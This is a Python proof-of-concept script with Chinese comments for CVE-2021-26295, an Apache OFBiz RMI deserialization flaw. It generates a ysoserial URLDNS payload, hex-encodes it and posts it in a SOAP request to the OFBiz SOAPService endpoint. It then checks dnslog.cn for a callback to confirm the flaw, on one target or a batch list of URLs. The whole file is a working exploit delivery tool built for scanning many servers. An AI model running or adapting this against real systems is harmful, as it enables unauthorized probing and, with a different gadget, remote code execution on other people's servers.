'''
Author: luckying
Date: 2021-03-24 15:01:29
LastEditTime: 2021-03-24 23:39:54
LastEditors: Please set LastEditors
Description: In User Settings Edit
FilePath: \Apache OFBiz\12.py
'''
import binascii
import requests
import subprocess
import time
import json
import os
import sys

from requests.sessions import session
os.system('')
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse


class CVE_2021_26295():
    def title(self):
        print('''
+-----------------------------------------------------------------+
漏洞名称:Apache OFBiz rmi反序列化（CVE-2021-26295 ）  
功能：单个检测，批量检测
说明：依赖ysoserial，请将ysoserial.jar放到与本脚本同一目录                                     
单个检测：python poc.py -u url -d domain
批量检测：python poc.py -f 1.txt
+-----------------------------------------------------------------+                                     
''')

    def trans(self, dnslog_url):
        cmd = subprocess.Popen(
            f'java -jar .\ysoserial.jar URLDNS {dnslog_url}',
            bufsize=0,
            executable=None,
            stdin=None,
            stdout=subprocess.PIPE,
            stderr=None,
            preexec_fn=None,
            close_fds=False,
            shell=True)
        #读取输出内容
        data = cmd.stdout.read()
        #字符转换
        hex_data = binascii.hexlify(data).decode("utf-8")
        return hex_data

    #漏洞检测
    def poc(self, target_url, hex_data):
        url = f'{target_url}/webtools/control/SOAPService'
        headers = {'Content-Type': 'text/xml'}
        data = f'''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><ying:clearAllEntityCaches xmlns:ying="http://ofbiz.apache.org/service/"><ying:cus-obj>{hex_data}</ying:cus-obj></ying:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>'''
        try:
            res = requests.post(url=url,
                                headers=headers,
                                data=data,
                                verify=False,
                                timeout=10)
            return res.status_code
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)

    #随机获取域名
    def dnslog_getdomain(self, session):
        url = 'http://www.dnslog.cn/getdomain.php?t=0'
        try:
            res = session.get(url, verify=False, timeout=10)
            return res.text
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)

    #获取dnslog响应信息
    def dnslog_getrecords(self, session, target_url, domain, count):
        url = 'http://www.dnslog.cn/getrecords.php?t=0'
        try:
            res = session.get(url, verify=False, timeout=10)
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
        if domain in res.text:
            if count == 0:
                print(f'[+] 获取到{domain}信息，目标 {target_url} 可能存在漏洞')
            else:
                print(f'[{str(count)}] 获取到{domain}信息，目标 {target_url} 可能存在漏洞')

    def main(self, target_url, dnslog_url, file):
        count = 0  #批量检测时计数用
        self.title()
        #手动输入域名
        if target_url and dnslog_url:
            hex_data = self.trans(dnslog_url)
            print('[+] 正在请求dnslog--------')
            status_code = self.poc(target_url, hex_data)
            if status_code == 200:
                print('[+] 响应值为200，请自行查看dnslog信息')
        #随机获取dnslog域名
        elif target_url:
            session = requests.session()
            domain = self.dnslog_getdomain(session)
            #print(f'获取随机域名：{domain}')
            hex_data = self.trans(f'http://{domain}')
            self.poc(target_url, hex_data)
            self.dnslog_getrecords(session, target_url, domain, count)
        elif file:
            for url in file:
                count += 1
                target_url = url.replace('\n', '')  #取消换行符
                session = requests.session()
                domain = self.dnslog_getdomain(session)
                time.sleep(1)
                hex_data = self.trans(f'http://{domain}')
                self.poc(target_url, hex_data)
                self.dnslog_getrecords(session, target_url, domain, count)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=False,
                        help="目标地址，带上http://")
    parser.add_argument("-d",
                        '--dnslog',
                        type=str,
                        default=False,
                        help="dnslog地址，带上http://")
    parser.add_argument("-f",
                        '--file',
                        type=argparse.FileType('r'),
                        default=False,
                        help="批量检测，带上http://")
    args = parser.parse_args()
    run = CVE_2021_26295()
    run.main(args.url, args.dnslog, args.file)
